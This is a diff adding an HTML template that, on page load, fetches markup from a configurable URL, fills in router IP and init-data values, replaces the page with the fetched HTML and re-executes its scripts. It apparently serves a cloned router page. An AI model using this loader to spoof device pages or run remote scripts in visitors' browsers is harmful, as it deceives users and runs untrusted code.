@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <script>
+    let INITDATA = "%INITDATA%";
+    let ROUTERIP = "%ROUTERIP%";
+    let INJECT_FROM = "%INJECT_FROM%";
+	
+    document.addEventListener('DOMContentLoaded', function () {
+      let xhr = new XMLHttpRequest();
+      xhr.open('GET', INJECT_FROM, true);
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState == 4 && xhr.status == 200) {
+          let html = xhr.responseText;
+          const parser = new DOMParser();
+          const doc = parser.parseFromString(html, 'text/html');
+  
+          const initDataElement = doc.getElementById("idInitData");
+          if (initDataElement) {
+            initDataElement.value = INITDATA;
+          }
+          const routerIPElement = doc.getElementById("idInfoIP");
+          if (routerIPElement) {
+            routerIPElement.innerHTML = ROUTERIP;
+          }
+          
+          document.documentElement.innerHTML = doc.documentElement.innerHTML;
+          
+          const externalScripts = Array.from(doc.querySelectorAll('script'));
+          const existingScripts = document.querySelectorAll('script');
+          existingScripts.forEach(script => script.remove());
+          
+          externalScripts.forEach(script => {
+            const newScript = document.createElement('script');
+            if (script.src) {
+              newScript.src = script.src;
+            } else {
+              newScript.innerHTML = script.innerHTML;
+            }
+            document.body.appendChild(newScript);
+          });
+        }
+      };
+      xhr.send();
+    });
+  </script>
+</head>
+<body>
+</body>
+</html>
